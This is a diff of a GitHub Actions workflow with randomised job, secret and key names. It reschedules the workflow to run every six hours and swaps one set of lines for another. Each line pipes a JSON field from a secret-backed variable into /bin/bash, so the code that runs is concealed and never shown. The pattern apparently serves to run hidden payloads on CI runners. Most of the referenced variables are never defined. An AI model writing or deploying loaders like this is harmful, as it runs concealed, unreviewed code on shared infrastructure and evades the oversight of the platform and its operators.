@@ -3,28 +3,19 @@ name: luoshantou8765
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 0/6 * * *'
+    - cron: '43 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: luoshantou8765
         env:
-          z9: ${{ secrets.z9 }}
+          cev64724: ${{ secrets.cev64724 }}
         run: |
-          echo $z9 | jq -r .jxpb69615 | /bin/bash
-          echo $w40 | jq -r .edult1 | /bin/bash
-          echo $ls58 | jq -r .rn04 | /bin/bash
-          echo $oei6 | jq -r .a10245 | /bin/bash
-          echo $oazc046 | jq -r .rhvp3 | /bin/bash
-          echo $x493 | jq -r .srgy44 | /bin/bash
-          echo $nn988 | jq -r .vkmbn0450 | /bin/bash
-          echo $yfwkl566 | jq -r .f2 | /bin/bash
-          echo $qit39 | jq -r .imtgk17560 | /bin/bash
-          echo $j5 | jq -r .pj83 | /bin/bash
-          echo $hpy49076 | jq -r .cifmp56 | /bin/bash
-          echo $d82773 | jq -r .nwsqz518 | /bin/bash
-          echo $t14884 | jq -r .kbl9 | /bin/bash
-          echo $a290 | jq -r .lr50 | /bin/bash
+          echo $cev64724 | jq -r .hwbp695 | /bin/bash
+          echo $q9895 | jq -r .ikp202 | /bin/bash
+          echo $gf0 | jq -r .qszz589 | /bin/bash
 
